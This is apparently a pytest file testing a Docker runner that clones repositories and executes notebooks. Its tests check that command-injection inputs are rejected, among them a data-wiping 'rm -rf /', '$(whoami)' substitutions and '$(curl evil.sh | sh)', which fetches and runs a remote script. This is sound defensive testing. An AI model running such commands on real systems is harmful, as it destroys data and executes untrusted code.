import subprocess
import sys
from pathlib import Path
from types import SimpleNamespace

import pytest

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT / "scripts"))

import docker_runner
from docker_runner import (
    DockerRunnerError,
    build_image,
    checkout_commit,
    cleanup,
    clone_repository,
    is_safe_shell_word,
    make_attempt_names,
    render_fix_command,
    run_container,
    sanitize_docker_name,
    write_build_context,
)


class FakeRunner:
    """Records every call it receives and returns a scripted result keyed
    by the argv's first element (git/docker), in call order. Never touches
    a real process."""

    def __init__(self, results):
        self._results = list(results)
        self.calls = []

    def __call__(self, argv, **kwargs):
        self.calls.append({"argv": argv, "kwargs": kwargs})
        outcome = self._results.pop(0)
        if isinstance(outcome, Exception):
            raise outcome
        return outcome


def _completed(returncode=0, stdout="", stderr=""):
    return SimpleNamespace(returncode=returncode, stdout=stdout, stderr=stderr)


# --- sanitize_docker_name / make_attempt_names ------------------------------


def test_sanitize_docker_name_lowercases_and_replaces_invalid_chars():
    assert sanitize_docker_name("My Repo/Name!!") == "my-repo-name"


def test_sanitize_docker_name_never_empty():
    assert sanitize_docker_name("!!!") == "unnamed"


def test_make_attempt_names_are_unique_per_call():
    first = make_attempt_names(8)
    second = make_attempt_names(8)
    assert first["container_name"] != second["container_name"]
    assert first["image_name"] != second["image_name"]
    assert first["work_dir_name"] != second["work_dir_name"]


# --- render_fix_command / write_build_context (safety) ----------------------


def test_render_fix_command_accepts_valid_install_argv():
    assert render_fix_command(["python", "-m", "pip", "install", "scikit-learn"]) == "python -m pip install scikit-learn"


def test_render_fix_command_accepts_valid_pin_version_argv():
    assert (
        render_fix_command(["python", "-m", "pip", "install", "scipy==1.13.1"])
        == "python -m pip install scipy==1.13.1"
    )


def test_render_fix_command_rejects_shell_metacharacters():
    with pytest.raises(DockerRunnerError):
        render_fix_command(["python", "-m", "pip", "install", "scikit-learn; rm -rf /"])


def test_render_fix_command_rejects_wrong_prefix_shape():
    with pytest.raises(DockerRunnerError):
        render_fix_command(["rm", "-rf", "/"])


def test_is_safe_shell_word_allows_equals_for_pin_version():
    assert is_safe_shell_word("scipy==1.13.1")


def test_is_safe_shell_word_rejects_whitespace_and_metacharacters():
    assert not is_safe_shell_word("scikit-learn; rm -rf /")
    assert not is_safe_shell_word("$(whoami)")
    assert not is_safe_shell_word("`whoami`")
    assert not is_safe_shell_word("a b")


def test_write_build_context_writes_dockerfile_and_entrypoint(tmp_path):
    build_dir = tmp_path / "build"
    write_build_context(build_dir, ["python", "-m", "pip", "install", "scikit-learn"])

    dockerfile = (build_dir / "Dockerfile").read_text(encoding="utf-8")
    entrypoint = (build_dir / "entrypoint.sh").read_text(encoding="utf-8")

    assert "FROM python:3.10-slim" in dockerfile
    assert "ENTRYPOINT [\"/entrypoint.sh\"]" in dockerfile
    assert "python -m pip install scikit-learn" in entrypoint
    assert "jupyter nbconvert" in entrypoint
    assert "--allow-errors" in entrypoint


def test_write_build_context_never_writes_crlf_line_endings(tmp_path):
    """A CRLF shebang line ("#!/bin/bash\r\n") makes Docker fail every
    container with "exec /entrypoint.sh: no such file or directory" - this
    was hit for real during this component's own pilot on a Windows host,
    caused by Path.write_text()'s default newline translation. Written
    files must always use bare LF regardless of the host platform."""
    build_dir = tmp_path / "build"
    write_build_context(build_dir, ["python", "-m", "pip", "install", "scikit-learn"])

    entrypoint_bytes = (build_dir / "entrypoint.sh").read_bytes()
    dockerfile_bytes = (build_dir / "Dockerfile").read_bytes()

    assert b"\r\n" not in entrypoint_bytes
    assert b"\r\n" not in dockerfile_bytes
    assert entrypoint_bytes.startswith(b"#!/bin/bash\n")


def test_write_build_context_refuses_to_write_unsafe_fix_command(tmp_path):
    build_dir = tmp_path / "build"
    with pytest.raises(DockerRunnerError):
        write_build_context(build_dir, ["python", "-m", "pip", "install", "$(curl evil.sh | sh)"])
    assert not (build_dir / "entrypoint.sh").exists()


# --- clone_repository --------------------------------------------------------


def test_clone_repository_success_uses_argv_list(tmp_path):
    runner = FakeRunner([_completed(returncode=0)])
    clone_repository("https://github.com/org/repo", tmp_path / "repo", runner=runner)

    assert len(runner.calls) == 1
    argv = runner.calls[0]["argv"]
    assert argv[0] == "git"
    assert argv[1] == "clone"
    assert "https://github.com/org/repo" in argv
    assert runner.calls[0]["kwargs"].get("shell", False) is False or "shell" not in runner.calls[0]["kwargs"]


def test_clone_repository_failure_raises_docker_runner_error(tmp_path):
    runner = FakeRunner([_completed(returncode=128, stderr="fatal: repository not found")])
    with pytest.raises(DockerRunnerError) as excinfo:
        clone_repository("https://github.com/org/does-not-exist", tmp_path / "repo", runner=runner)
    assert excinfo.value.stage == "clone"


def test_clone_repository_rejects_non_github_url(tmp_path):
    runner = FakeRunner([])
    with pytest.raises(DockerRunnerError):
        clone_repository("not-a-url", tmp_path / "repo", runner=runner)
    assert runner.calls == []


def test_clone_repository_timeout_raises_docker_runner_error(tmp_path):
    runner = FakeRunner([subprocess.TimeoutExpired(cmd="git clone", timeout=1)])
    with pytest.raises(DockerRunnerError) as excinfo:
        clone_repository("https://github.com/org/repo", tmp_path / "repo", runner=runner, timeout=1)
    assert excinfo.value.stage == "clone"


# --- checkout_commit ----------------------------------------------------------


def test_checkout_commit_skips_when_no_commit_recorded(tmp_path):
    runner = FakeRunner([])
    status = checkout_commit(tmp_path, None, runner=runner)
    assert status == "skipped_no_commit"
    assert runner.calls == []


def test_checkout_commit_success(tmp_path):
    runner = FakeRunner([_completed(returncode=0)])
    status = checkout_commit(tmp_path, "abc123", runner=runner)
    assert status == "checked_out"
    assert runner.calls[0]["argv"] == ["git", "checkout", "abc123"]


def test_checkout_commit_failure_raises_and_never_falls_back_silently(tmp_path):
    runner = FakeRunner([_completed(returncode=1, stderr="fatal: reference is not a tree")])
    with pytest.raises(DockerRunnerError) as excinfo:
        checkout_commit(tmp_path, "deadbeef", runner=runner)
    assert excinfo.value.stage == "checkout"


# --- build_image ---------------------------------------------------------------


def test_build_image_success(tmp_path):
    runner = FakeRunner([_completed(returncode=0)])
    build_image(tmp_path, "i5-image-test", runner=runner)
    argv = runner.calls[0]["argv"]
    assert argv == ["docker", "build", "-t", "i5-image-test", str(tmp_path)]


def test_build_image_failure_raises(tmp_path):
    runner = FakeRunner([_completed(returncode=1, stderr="Dockerfile not found")])
    with pytest.raises(DockerRunnerError) as excinfo:
        build_image(tmp_path, "i5-image-test", runner=runner)
    assert excinfo.value.stage == "build"


def test_build_image_timeout_raises(tmp_path):
    runner = FakeRunner([subprocess.TimeoutExpired(cmd="docker build", timeout=1)])
    with pytest.raises(DockerRunnerError) as excinfo:
        build_image(tmp_path, "i5-image-test", runner=runner, timeout=1)
    assert excinfo.value.stage == "build"


# --- run_container --------------------------------------------------------------


def test_run_container_success_uses_argv_array_no_shell(tmp_path):
    runner = FakeRunner([_completed(returncode=0, stdout="[ENTRYPOINT] Completed notebook execution")])
    result = run_container("img", "container", tmp_path, "nb.ipynb", runner=runner)

    assert result.return_code == 0
    assert not result.timed_out
    argv = runner.calls[0]["argv"]
    assert argv[0] == "docker"
    assert argv[1] == "run"
    assert "--rm" in argv
    assert f"{tmp_path}:/app" in argv


def test_run_container_passes_setup_paths_when_given(tmp_path):
    runner = FakeRunner([_completed(returncode=0)])
    run_container("img", "container", tmp_path, "nb.ipynb", setup_paths=["setup.py", "sub/setup.py"], runner=runner)
    argv = runner.calls[0]["argv"]
    assert "SETUP_PATHS=setup.py;sub/setup.py" in argv


def test_run_container_timeout_reports_timed_out_true(tmp_path):
    runner = FakeRunner([subprocess.TimeoutExpired(cmd="docker run", timeout=1, output=b"", stderr=b"")])
    result = run_container("img", "container", tmp_path, "nb.ipynb", runner=runner, timeout=1)
    assert result.timed_out is True
    assert result.return_code == -1


def test_run_container_captures_fix_install_failed_sentinel(tmp_path):
    runner = FakeRunner([_completed(returncode=1, stdout="[FIX] Running: ...\nFIX_INSTALL_FAILED")])
    result = run_container("img", "container", tmp_path, "nb.ipynb", runner=runner)
    assert result.return_code != 0
    assert "FIX_INSTALL_FAILED" in result.stdout


# --- cleanup ------------------------------------------------------------------


def test_cleanup_removes_container_and_work_dir(tmp_path):
    work_dir = tmp_path / "work"
    work_dir.mkdir()
    (work_dir / "marker.txt").write_text("x", encoding="utf-8")

    runner = FakeRunner([_completed(returncode=0)])
    cleanup("some-container", work_dir, runner=runner)

    assert runner.calls[0]["argv"] == ["docker", "rm", "-f", "some-container"]
    assert not work_dir.exists()


def test_cleanup_never_raises_even_if_docker_rm_fails(tmp_path):
    work_dir = tmp_path / "work"
    work_dir.mkdir()

    def failing_runner(argv, **kwargs):
        raise RuntimeError("docker daemon unreachable")

    cleanup("some-container", work_dir, runner=failing_runner)
    assert not work_dir.exists()


def test_cleanup_handles_none_container_and_none_work_dir():
    cleanup(None, None, runner=FakeRunner([]))


def test_cleanup_removes_read_only_files_left_by_a_real_git_clone(tmp_path):
    """A fresh `git clone` on Windows leaves some .git pack files
    read-only; a plain shutil.rmtree(ignore_errors=True) silently leaves
    them (and their parent dirs) behind - observed directly during this
    component's real-container pilot. cleanup() must actually remove them."""
    work_dir = tmp_path / "work"
    git_dir = work_dir / "repo" / ".git"
    git_dir.mkdir(parents=True)
    readonly_file = git_dir / "packed-refs"
    readonly_file.write_text("data", encoding="utf-8")
    readonly_file.chmod(0o444)

    cleanup(None, work_dir, runner=FakeRunner([]))

    assert not work_dir.exists()


# --- module-level safety scan ------------------------------------------------


def test_module_never_uses_shell_true_or_dangerous_execution():
    source = Path(docker_runner.__file__).read_text(encoding="utf-8")
    assert "shell=True" not in source
    assert "os.system(" not in source
    assert "eval(" not in source
    assert "exec(" not in source
